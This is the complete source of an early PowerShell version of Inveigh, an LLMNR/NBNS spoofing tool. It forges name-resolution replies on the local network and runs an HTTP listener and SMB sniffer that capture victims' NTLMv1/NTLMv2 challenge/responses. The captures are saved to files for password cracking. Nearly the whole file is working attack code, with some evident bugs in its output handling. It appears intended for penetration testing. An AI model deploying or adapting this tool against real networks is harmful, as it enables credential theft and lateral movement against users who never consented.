# Inveigh - PowerShell LLMNR/NBNS Spoofer
# 
# Usage: 
#   Obtain an elevated administrator or SYSTEM shell.
#   If necessary, execute Set-ExecutionPolicy Unrestricted within PowerShell.
#
#   To execute with default settings:
#   Inveigh.ps1 -i localip
#
#   To execute with features enabled/disabled:
#   Inveigh.ps1 -i localip -LLMNR Y/N -NBNS Y/N -HTTP Y/N -SMB Y/N
#   
# Notes:
#   Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.
#   LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
#   SMB challenge/response captures are performed by sniffing over the host system's SMB service.
#   HTTP challenge/response captures are performed with a dedicated listener.
#   The local LLMNR/NBNS services do not need to be disabled on the client system.
#   LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
#   Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
#   Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall.
#   Output files will be created in current working directory.
#   If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
#   Code is proof of concept level and may not work under some scenarios.
#

param( 
    [String]$i = "", [String]$HTTP="yes", [String]$SMB="yes", [String]$LLMNR="yes", [String]$NBNS="yes", [switch]$Help )
   
if( $Help )
{
	Write-Host "usage: $($MyInvocation.MYCommand) [-i - Local IP Address] [-HTTP Y/N] [-SMB Y/N] [-LLMNR Y/N] [-NBNS Y/N]"
	exit -1
}

if(-not($i)) { Throw "Specify a local IP address with -i" }

$working_directory = $PWD.Path
$log_out_file = $working_directory + "\Inveigh-Log.txt"
$NTLMv1_out_file = $working_directory + "\Inveigh-NTLMv1.txt"
$NTLMv2_out_file = $working_directory + "\Inveigh-NTLMv2.txt"

# Write startup messages
$start_time = Get-Date
Write-Output "Inveigh started at $(Get-Date -format 's')"
"Inveigh started at $(Get-Date -format 's')" |Out-File $log_out_file -Append
Write-Output "Listening IP Address = $i"
if($LLMNR.StartsWith('y','CurrentCultureIgnoreCase'))
{
Write-Output 'LLMNR Spoofing Enabled'
}
else
{
Write-Output 'LLMNR Spoofing Disabled'
}
if($NBNS.StartsWith('y','CurrentCultureIgnoreCase'))
{
Write-Output 'NBNS Spoofing Enabled'
}
else
{
Write-Output 'NBNS Spoofing Disabled'
}
if($HTTP.StartsWith('y','CurrentCultureIgnoreCase'))
{
Write-Output 'HTTP Capture Enabled'
}
else
{
Write-Output 'HTTP Capture Disabled'
}
if($SMB.StartsWith('y','CurrentCultureIgnoreCase'))
{
Write-Output 'SMB Capture Enabled'
}
else
{
Write-Output 'SMB Capture Disabled'
}
Write-Output "Working Directory = $working_directory"
Write-Host "Press CTRL+C to exit" -fore red

$byte_in = New-Object Byte[] 4	
$byte_out = New-Object Byte[] 4	
$byte_data = New-Object Byte[] 4096
$byte_in[0] = 1  					
$byte_in[1-3] = 0
$byte_out[0] = 1
$byte_out[1-3] = 0

# Sniffer socket setup
$sniffer_socket = New-Object System.Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::IP )
$sniffer_socket.SetSocketOption( "IP", "HeaderIncluded", $true )
$sniffer_socket.ReceiveBufferSize = 1024000
$end_point = New-Object System.Net.IPEndpoint( [Net.IPAddress]"$i", 0 )
$sniffer_socket.Bind( $end_point )
[void]$sniffer_socket.IOControl( [Net.Sockets.IOControlCode]::ReceiveAll, $byte_in, $byte_out )

Function DataToUInt16( $field )
{
	[Array]::Reverse( $field )
	return [BitConverter]::ToUInt16( $field, 0 )
}

Function DataToUInt32( $field )
{
	[Array]::Reverse( $field )
	return [BitConverter]::ToUInt32( $field, 0 )
}

Function DataLength
{
Param ([int]$length_start,[byte[]]$string_extract_data)
    try{
        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start+1)],0)
    }
    catch{}
return $string_length
}

Function DataToString
{
Param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)
                        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
                        $string_data = $string_data -replace "-00",""
                        $string_data = $string_data.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
return $string_extract
}

# HTTP Server ScriptBlock
$HTTP_scriptblock = 
{
     
    Param ($listener,$NTLMv1_out_file,$NTLMv2_out_file)
    
    while ($listener.IsListening) {
    $hash.context = $listener.GetContext() 
    $hash.request = $hash.context.Request
    $hash.response = $hash.context.Response
    $hash.message = ''
    
    if ($hash.request.Url -match '/stop$') #temp fix to shutdown listener
    {
    $listener.stop() 
    break
    }
 
    Function DataLength
    {
    Param ([int]$length_start,[byte[]]$string_extract_data)
    try{
        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start+1)],0)
    }
    catch{}
    return $string_length
    }

    Function DataToString
    {
    Param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)
        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
    return $string_extract
    }

    try{
    $NTLM_challenge = '1122334455667788'
    $NTLM = 'NTLM'
    $hash.response.StatusCode = 401
       [string]$authentication_header = $hash.request.headers.getvalues('Authorization')
       if($authentication_header.startswith('NTLM '))
       {
       $authentication_header = $authentication_header -replace 'NTLM ',''
       [byte[]] $HTTP_request_byte = [System.Convert]::FromBase64String($authentication_header)
       $hash.response.StatusCode = 401
       if ($HTTP_request_byte[8] -eq 1)
       {
       $NTLM = 'NTLM TlRMTVNTUAACAAAABgAGADgAAAAFgomiESIzRFVmd4gAAAAAAAAAAIIAggA+AAAABgGxHQAAAA9MAEEAQgACAAYATABBAEIAAQAQAEgATwBTAFQATgBBAE0ARQAEABIAbABhAGIALgBsAG8AYwBhAGwAAwAkAGgAbwBzAHQAbgBhAG0AZQAuAGwAYQBiAC4AbABvAGMAYQBsAAUAEgBsAGEAYgAuAGwAbwBjAGEAbAAHAAgApMf4tnBy0AEAAAAACgo='
       $hash.response.StatusCode = 401
        }
       elseif ($HTTP_request_byte[8] -eq 3)
       {
       $NTLM = 'NTLM'
       $sendPacket = [System.BitConverter]::ToString($HTTP_request_byte)
       
       $HTTP_NTLM_offset = $HTTP_request_byte[24]
       
       $HTTP_NTLM_length = DataLength 22 $HTTP_request_byte
                 
       $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_byte
                        
       if($HTTP_NTLM_domain_length -eq 0)
        {
            $HTTP_NTLM_domain_string = ''
        }
        else{  
            $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 88 $HTTP_request_byte
        }
                        
        $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_byte
        $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 88 $HTTP_request_byte
                        
        $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_byte
        $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length 88 $HTTP_request_byte
        
        if($HTTP_NTLM_length -eq 24)
        {
        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_byte[($HTTP_NTLM_offset-24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
        $NTLM_response = $NTLM_response.Insert(48,':')
        $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
        $hash.host.ui.WriteLine($(Get-Date -format 's') + " - HTTP NTLMv1 challenge/response captured from " + $hash.request.RemotEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash)
        $hash.host.ui.WritewarningLine("HTTP NTLMv1 challenge/response written to " + $NTLMv1_out_file)
        $hash.HTTP_NTLM_hash |Out-File $NTLMv1_out_file -Append
        }
        else
        {              
        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_byte[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
        $NTLM_response = $NTLM_response.Insert(32,':')
        $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
        $hash.host.ui.WriteLine($(Get-Date -format 's') + " - HTTP NTLMv2 challenge/response captured from " + $hash.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash)
        $hash.host.ui.WritewarningLine("HTTP NTLMv2 challenge/response written to " + $NTLMv2_out_file)
        $hash.HTTP_NTLM_hash |Out-File $HTTP_out_file -Append
        } 
        $hash.response.StatusCode = 200
       }
       else{
       $NTLM = 'NTLM'
        }
       
       }
       [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($hash.message)
        $hash.response.ContentLength64 = $buffer.length
        $hash.response.AddHeader("WWW-Authenticate",$NTLM)
        $output = $hash.response.OutputStream
        $output.Write($buffer, 0, $buffer.length)
        $output.Close()
         }
       catch{}
       }
}

# HTTP Server
Function Start-HTTP-Server()
{
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://*:80/')
$listener.AuthenticationSchemes = "Anonymous" 
$listener.Start()
$hash = [hashtable]::Synchronized(@{})
$hash.Host = $host
$runspace = [runspacefactory]::CreateRunspace()
$runspace.Open()
$runspace.SessionStateProxy.SetVariable('Hash',$hash)#may not need
$powershell = [powershell]::Create()
$powershell.Runspace = $runspace
$powershell.AddScript($HTTP_scriptblock).AddArgument($listener).AddArgument($NTLMv1_out_file).AddArgument($NTLMv2_out_file) > $null
$handle = $powershell.BeginInvoke()
}

# HTTP Server Start
if($HTTP.StartsWith('y','CurrentCultureIgnoreCase'))
{
Start-HTTP-Server
#write-output "$(Get-Date -format 's') - HTTP Server Started"
}

# Main Sniffer Loop
Try
{
while( $true )
{
Try
 {
    $packet_data = $sniffer_socket.Receive( $byte_data, 0, $byte_data.length, [Net.Sockets.SocketFlags]::None )
 }
Catch
 {}
	
	$memory_stream = New-Object System.IO.MemoryStream( $byte_data, 0, $packet_data )
	$binary_reader = New-Object System.IO.BinaryReader( $memory_stream )
    
    # IP header fields
	$version_HL = $binary_reader.ReadByte( )
	$type_of_service= $binary_reader.ReadByte( )
	$total_length = DataToUInt16 $binary_reader.ReadBytes( 2 )
	$identification = $binary_reader.ReadBytes( 2 )
	$flags_offset = $binary_reader.ReadBytes( 2 )
	$TTL = $binary_reader.ReadByte( )
	$protocol_number = $binary_reader.ReadByte( )
	$header_checksum = [Net.IPAddress]::NetworkToHostOrder( $binary_reader.ReadInt16() )
    $source_IP_bytes = $binary_reader.ReadBytes( 4 )
	$source_IP = [System.Net.IPAddress]$source_IP_bytes
	$destination_IP_bytes = $binary_reader.ReadBytes( 4 )
	$destination_IP = [System.Net.IPAddress]$destination_IP_bytes

	$ip_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
	$header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
	
	#$payload_data = ""
    
    switch($protocol_number)
    {
    6 {  # TCP
			$source_port = DataToUInt16 $binary_reader.ReadBytes(2)
			$destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
			$sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
			$ack_number = DataToUInt32 $binary_reader.ReadBytes(4)
			$TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
			$TCP_flags = $binary_reader.ReadByte()
			$TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
			$TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
			$TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)
            
			$payload_data = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
	   }       
    17 {  # UDP
			$source_port =  $binary_reader.ReadBytes(2)
            $source_port_2 = DataToUInt16 ($source_port)
			$destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
			$UDP_length = $binary_reader.ReadBytes(2)
            $UDP_length_2  = DataToUInt16 ($UDP_length)
			[void]$binary_reader.ReadBytes(2)
            
			$payload_data = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
       }
    }
    
    # Incoming packets 
    switch ($destination_port)
    {
    137 { # NBNS
        if($NBNS.StartsWith('y','CurrentCultureIgnoreCase'))
        {
            if($payload_data[5] -eq 1)
            {
            
                try{
                    $UDP_length[0] += $payload_data.length - 2
                    [Byte[]] $NBNS_response_data = $payload_data[13..$payload_data.length]
                    $NBNS_response_data += (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)
                    $NBNS_response_data += ([IPAddress][String]([IPAddress]$i)).GetAddressBytes()
                    $NBNS_response_data += (0x00,0x00,0x00,0x00)
            
                    [Byte[]] $NBNS_response_packet = (0x00,0x89)
                    $NBNS_response_packet += $source_port[1,0]
                    $NBNS_response_packet += $UDP_length[1,0]
                    $NBNS_response_packet += (0x00,0x00)
                    $NBNS_response_packet += $payload_data[0,1]
                    $NBNS_response_packet += (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)
                    $NBNS_response_packet += $NBNS_response_data
            
                    $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                    $send_socket.SendBufferSize = 1024
                    $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
                    [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
                    $send_socket.Close( )
            
                    $NBNS_query = [System.BitConverter]::ToString($payload_data[13..$payload_data.length])
                    $NBNS_query = $NBNS_query -replace "-00",""
                    $NBNS_query = $NBNS_query.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                    $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                    
                    $NBNS_query_string_subtracted = ""
                    $NBNS_query_string = ""
                    $n = 0
                    Do {
                        $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
                        $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
                        $n += 1
                    }
                    Until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    $n = 0
                    Do {
                    $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
                    $n += 2
                    }
                    Until($n -gt ($NBNS_query_string_subtracted.Length - 1))
                    write-output "$(Get-Date -format 's') - NBNS request for '$NBNS_query_string' received from $source_IP - spoofed response has been sent"
                    "$(Get-Date -format 's') - NBNS request for '$NBNS_query_string' received from $source_IP - spoofed response has been sent" |Out-File $log_out_file -Append
                }
                catch{}
            }
        }
    }
    445 { # SMB
        if($SMB.StartsWith('y','CurrentCultureIgnoreCase'))
        {
            if (($payload_data[121] -eq 3) -and ($payload_data[122..124] -eq 0))
            {
                $NTLMv2_offset = $payload_data[137] + 113
                
                $NTLMv2_length = DataLength 135 $payload_data
                $NTLMv2_length += 224
                        
                $NTLMv2_domain_length = DataLength 141 $payload_data
                $NTLMv2_domain_string = DataToString $NTLMv2_domain_length 0 0 201 $payload_data
                        
                $NTLMv2_user_length = DataLength 149 $payload_data
                $NTLMv2_user_string = DataToString $NTLMv2_user_length $NTLMv2_domain_length 0 201 $payload_data
                        
                $NTLMv2_host_length = DataLength 157 $payload_data
                $NTLMv2_host_string = DataToString $NTLMv2_host_length $NTLMv2_user_length $NTLMv2_domain_length 201 $payload_data
                        
                $NTLMv2_length += ($NTLMv2_user_length) + ($NTLMv2_domain_length) + ($NTLMv2_host_length)
                $NTLMv2_response = [System.BitConverter]::ToString($payload_data[$NTLMv2_offset..$NTLMv2_length]) -replace "-",""
                $NTLMv2_response = $NTLMv2_response.Insert(32,':')
                $NTLMv2_hash = $NTLMv2_user_string + "::" + $NTLMv2_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
                      
                write-output "$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLMv2_host_string):`n$ntlmv2_hash"
                write-warning "SMB NTLMv2 challenge/response written to $NTLMv2_out_file"
                $NTLMv2_hash |Out-File $NTLMv2_out_file -Append
            }
            elseif (($payload_data[117] -eq 3) -and ($payload_data[118..120] -eq 0))
            {
            $NTLMv1_offset = $payload_data[133] + 85
                
                $NTLMv1_length = DataLength 129 $payload_data
                
                $NTLMv1_length += 220
                        
                $NTLMv1_domain_length = DataLength 137 $payload_data
                $NTLMv1_domain_string = DataToString $NTLMv1_domain_length 0 0 197 $payload_data
                        
                $NTLMv1_user_length = DataLength 145 $payload_data
                $NTLMv1_user_string = DataToString $NTLMv1_user_length $NTLMv1_domain_length 0 197 $payload_data
                        
                $NTLMv1_host_length = DataLength 153 $payload_data
                $NTLMv1_host_string = DataToString $NTLMv1_host_length $NTLMv1_user_length $NTLMv1_domain_length 197 $payload_data
                        
                $NTLMv1_length += ($NTLMv1_user_length) + ($NTLMv1_domain_length) + ($NTLMv1_host_length)
                $NTLMv1_response = [System.BitConverter]::ToString($payload_data[$NTLMv1_offset..$NTLMv1_length]) -replace "-",""
                $NTLMv1_response = $NTLMv1_response.Insert(48,':')
                $NTLMv1_hash = $NTLMv1_user_string + "::" + $NTLMv1_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge
                      
                write-output "$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLMv1_host_string):`n$NTLMv1_hash"
                write-warning "SMB NTLMv1 challenge/response written to $NTLMv1_out_file"
                $NTLMv1_hash |Out-File $NTLMv1_out_file -Append
            }
        }
    }
    5355 { # LLMNR
       if($LLMNR.StartsWith('y','CurrentCultureIgnoreCase'))
       {
            $UDP_length[0] += $payload_data.length - 2
            [Byte[]] $LLMNR_response_data = $payload_data[12..$payload_data.length]
            $LLMNR_response_data += $LLMNR_response_data
            $LLMNR_response_data += (0x00,0x00,0x00,0x1e,0x00,0x04)
            $LLMNR_response_data += ([IPAddress][String]([IPAddress]$i)).GetAddressBytes()
            
            [Byte[]] $LLMNR_response_packet = (0x14,0xeb)
            $LLMNR_response_packet += $source_port[1,0]
            $LLMNR_response_packet += $UDP_length[1,0]
            $LLMNR_response_packet += (0x00,0x00)
            $LLMNR_response_packet += $payload_data[0,1]
            $LLMNR_response_packet += (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)
            $LLMNR_response_packet += $LLMNR_response_data
            
            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
            $send_socket.SendBufferSize = 1024
            $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
            [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
            $send_socket.Close( )
            
            $LLMNR_query = [System.BitConverter]::ToString($payload_data[13..($payload_data.length - 4)])
            $LLMNR_query = $LLMNR_query -replace "-00",""
            $LLMNR_query = $LLMNR_query.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
            write-output "$(Get-Date -format 's') - LLMNR request for '$LLMNR_query_string' received from $source_IP - spoofed response has been sent"
            "$(Get-Date -format 's') - LLMNR request for '$LLMNR_query_string' received from $source_IP - spoofed response has been sent" |Out-File $log_out_file -Append
       }
    }
    }
    
    # Outgoing packets
    switch ($source_port)
    {
    445 { # SMB
        if($NBNS.StartsWith('y','CurrentCultureIgnoreCase'))
        {
            if (($payload_data[115] -eq 2) -and ($payload_data[116..118] -eq 0))
            {
                $NTLM_challenge = [System.BitConverter]::ToString($payload_data[131..138]) -replace "-",""   
            }
        }
        }
    }
}
}
Finally
{
write-warning "Inveigh exited at $(Get-Date -format 's')"
"Inveigh exited at $(Get-Date -format 's')" | Out-File $log_out_file -Append
$web_request = [System.Net.WebRequest]::Create('http://' + $i + '/stop') # Temp fix for HTTP shutdown
$web_request.Method = "GET"
$res = $web_request.GetResponse()
$listener.Close()
$listener.Stop()
$binary_reader.Close()
$memory_stream.Close()
$sniffer_socket.Close()
}
